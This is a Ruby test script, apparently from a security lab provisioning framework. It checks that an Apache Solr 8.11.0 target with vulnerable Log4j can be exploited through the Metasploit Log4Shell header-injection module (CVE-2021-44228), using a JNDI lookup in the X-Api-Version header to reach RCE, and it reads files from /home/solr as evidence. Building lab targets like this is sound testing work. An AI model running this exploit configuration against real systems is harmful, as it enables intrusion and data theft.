require_relative '../../../../../lib/post_provision_test'

# Post-provision test for the Log4Shell JNDI header injection vulnerability
# (CVE-2021-44228, exploit/multi/http/log4shell_header_injection) against
# Apache Solr 8.11.0, which bundles the vulnerable Log4j 2.14.1.
#
# Tiers:
#   1  Solr and the pinned Temurin 11 JRE are installed on the target.
#   2  Solr is listening on 8983 and serves its admin UI.
#   3  a real exploit from the attacker VM achieves RCE as the solr user,
#      via a crafted HTTP header containing a JNDI LDAP lookup string.
#
# TARGETURI/HEADER target the Solr admin cores endpoint, per the module's
# own documented support for Apache Solr; if this combination doesn't trigger
# the lookup on a live build, the AutoCheck/msf_output evidence will show why.
class Log4shellHeaderInjectionTest < PostProvisionTest
  def initialize
    self.module_name = 'log4shell_header_injection'
    self.module_path = get_module_path(__FILE__)
    super
    self.port = 8983
  end

  def test_module
    super

    # Tier 1 — installed on the target.
    tier(1) do
      test_command_succeeds('solr extracted', 'test -x /opt/solr/bin/solr')
      test_command_succeeds('temurin 11 jre installed', 'test -x /usr/local/jre11/bin/java')
    end

    # Tier 2 — Solr listens and serves its admin UI.
    tier(2) do
      test_service_up
      test_http('/solr/', match: 'Solr Admin')
    end

    # Tier 3 — exploit from the attacker VM; also captures the leaked flag
    # from /home/solr into the sentinel as evidence.
    test_msf_exploit('exploit/multi/http/log4shell_header_injection',
                     rport: 8983,
                     collect: 'cat /home/solr/*',
                     options: {
                       'TARGETURI' => '/solr/admin/cores',
                       'HEADER'    => 'X-Api-Version',
                     },
                     tier: 3)
  end
end

Log4shellHeaderInjectionTest.new.run
